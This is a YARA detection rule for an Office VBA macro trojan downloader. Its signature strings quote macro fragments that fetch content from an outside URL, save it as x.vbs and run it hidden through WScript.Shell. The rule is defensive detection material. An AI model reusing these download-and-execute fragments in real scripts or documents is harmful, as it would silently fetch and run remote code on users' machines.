
rule TrojanDownloader_O97M_Obfuse_PHG_MTB{
	meta:
		description = "TrojanDownloader:O97M/Obfuse.PHG!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,06 00 06 00 06 00 00 "
		
	strings :
		$a_01_0 = {78 6d 6c 48 74 74 70 2e 4f 70 65 6e 20 22 47 45 54 22 2c 20 73 55 52 4c 2c 20 46 61 6c 73 65 } //1 xmlHttp.Open "GET", sURL, False
		$a_01_1 = {78 6d 6c 48 74 74 70 2e 73 65 6e 64 20 22 22 } //1 xmlHttp.send ""
		$a_01_2 = {66 73 54 2e 4f 70 65 6e 20 27 4f 70 65 6e 20 74 68 65 20 73 74 72 65 61 6d 20 41 6e 64 20 77 72 69 74 65 20 62 69 6e 61 72 79 20 64 61 74 61 20 54 6f 20 74 68 65 20 6f 62 6a 65 63 74 } //1 fsT.Open 'Open the stream And write binary data To the object
		$a_01_3 = {66 73 54 2e 57 72 69 74 65 54 65 78 74 20 28 47 65 74 48 54 4d 4c 53 6f 75 72 63 65 28 22 68 74 74 70 73 3a 2f 2f 77 74 6f 6f 6c 73 2e 69 6f 2f 63 6f 64 65 2f 64 6c 2f 62 36 4a 68 22 29 29 } //1 fsT.WriteText (GetHTMLSource("https://wtools.io/code/dl/b6Jh"))
		$a_01_4 = {66 73 54 2e 53 61 76 65 54 6f 46 69 6c 65 20 22 78 2e 76 62 73 22 2c 20 32 20 27 53 61 76 65 20 62 69 6e 61 72 79 20 64 61 74 61 20 54 6f 20 64 69 73 6b } //1 fsT.SaveToFile "x.vbs", 2 'Save binary data To disk
		$a_01_5 = {43 72 65 61 74 65 4f 62 6a 65 63 74 28 22 57 53 63 72 69 70 74 2e 53 68 65 6c 6c 22 29 2e 52 75 6e 20 22 78 2e 76 62 73 22 2c 20 30 2c 20 46 61 6c 73 65 } //1 CreateObject("WScript.Shell").Run "x.vbs", 0, False
	condition:
		((#a_01_0  & 1)*1+(#a_01_1  & 1)*1+(#a_01_2  & 1)*1+(#a_01_3  & 1)*1+(#a_01_4  & 1)*1+(#a_01_5  & 1)*1) >=6
 
}